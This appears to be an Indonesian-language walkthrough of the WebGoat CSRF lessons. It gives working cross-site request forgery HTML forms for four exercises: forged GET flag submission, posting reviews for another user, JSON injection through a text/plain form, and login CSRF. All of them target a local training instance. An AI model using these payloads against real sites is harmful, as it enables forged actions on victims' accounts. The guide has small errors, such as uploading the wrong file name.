# Cross-Site Request Forgeries
CSRF atau XSRF adalah jenis eksploitasi berbahaya pada situs web di mana perintah tidak sah dikirimkan dari pengguna yang mengunjungi situs web tersebut.

## Basic Get CSRF Exercise
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/2
- Klik kanan pada samping tombol **Submit Query** lalu pilih Inspect

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%201.JPG)

- Temukan sebuah form di sekitar tombol tersebut

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%202.JPG)

- Sekarang kita copy form tersebut dengan cara klik kanan lalu pilih Copy > Outer HTML

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%203.JPG)

- Disini webgoat berjalan di localhost dan port 9001 sehingga kita perlu menambahkan informasi tersebut pada atribut action sehingga source code nya menjadi seperti berikut ini, simpan dengan nama **csrf.html**
```sh
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="http://127.0.0.1:9001/WebGoat/csrf/basic-get-flag">
	<input name="csrf" type="hidden" value="false">
	<input type="submit" name="submit">
</form>
```
- Login ke web wolf di tab baru melalui url http://127.0.0.1:9090/login dan login menggunakan akun yang anda gunakan di webgoat

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%204.JPG)

- Pergi ke menu Files

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%205.JPG)

- Unggah file **csrf.html**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%206.JPG)

- Jika sudah berhasil terunggah klik link

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%207.JPG)

- Lalu tekan tombol **Submit Query**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%208.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%209.JPG)

- Kembali ke halaman webgoat http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/2 dan masukkan nilai flag

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2010.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2011.JPG)

## Post a review on someone else’s behalf
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/3
- Klik kanan pada salah satu field lalu pilih Inspect

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2012.JPG)

- Disini ditemukan sebuah form, yang perlu kita lakukan adalah membajak form tersebut

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2013.JPG)

- Pilih tag form lalu klik kanan dan lalu pilih Copy > Outer HTML

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2014.JPG)

- Disini webgoat berjalan di localhost dan port 9001 sehingga kita perlu menambahkan informasi tersebut pada atribut action sehingga source code nya menjadi seperti berikut ini, simpan dengan nama **csrf2.html**
```sh
<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="http://127.0.0.1:9001/WebGoat/csrf/review">
	<input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text">
        <input class="form-control" id="reviewStars" name="stars" type="text">
        <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
        <input type="submit" name="submit" value="Submit review">
</form>
```
- Buka kembali fitur Files pada web wolf yang sudah kita akses dipertanyaan sebelumnya http://127.0.0.1:9090/files

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2015.JPG)

- Unggah file **csrf2.html**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2016.JPG)

- Jika sudah berhasil terunggah klik link

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2017.JPG)

- Tekan tombol **Submit review** tanpa harus mengisi form terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2018.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2019.JPG)

## CSRF and content-type
- Sumber referensi: https://pentestmonkey.net/blog/csrf-xml-post-request
- Disini kita akan membajak form di halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/6 sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2020.JPG)

- Form tersebut harus mengarah ke path URL **/csrf/feedback/message**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2021.JPG)

- Buat sebuah halaman dengan kode HTML sebagai berikut lalu simpan dengan nama **csrf3.html**
```sh
<form name="csrf-feedback" enctype="text/plain" action="http://127.0.0.1:9001/WebGoat/csrf/feedback/message" method="POST">
	<input type="hidden" name='{"name":"Webgoat","email":"webgoat@webgoat.org","subject":"Suggestions","message":"Test Message' value='"}'>
	<input type="submit">
</form>
```
- Unggah file **csrf3.html** ke menu files di web wolf http://127.0.0.1:9090/files

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2022.JPG)

- Jika sudah berhasil terunggah klik link

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2023.JPG)

- Lalu tekan tombol **Submit Query**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2024.JPG)

- Copy nilai flag

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2025.JPG)

- Paste ke field flag di halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/6

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2026.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2027.JPG)

## Login CSRF attack
- Registerasi user baru di http://127.0.0.1:9001/WebGoat/registration. Jika nama user yang anda gunakan adalah `tom` maka harus mendaftarkan user baru dengan nama `csrf-tom`
- Karena nama user yang saya gunakan adalah `testing` maka saya mendaftarkan user baru dengan nama `csrf-testing`

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2028.JPG)

- Setelah registerasi berhasil, kita akan otomatis login sebagai user baru. Silahkan Log Out lalu login dengan akun user asli

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2029.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2030.JPG)

- Buat sebuah halaman dengan kode HTML sebagai berikut. Isi username dan password sesuai dengan akun yang anda daftarkan tadi, lalu simpan dengan nama **csrf4.html**
```sh
<form action="http://127.0.0.1:9001/WebGoat/login" method="POST">
	<input type="hidden" name="username" value="csrf-testing">
	<input type="hidden" name="password" value="testing">
	<input type="submit">
</form>
<script>document.login.submit()</script>
```
- Unggah file **csrf3.html** ke menu files di web wolf http://127.0.0.1:9090/files

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2031.JPG)

- Jika sudah berhasil terunggah klik link

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2032.JPG)

- Lalu tekan tombol **Submit Query**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2033.JPG)

- Setelah berhasil login, pergi ke halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/7

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2034.JPG)

- Kemudian tekan tombol **Solved!**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2035.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2036.JPG)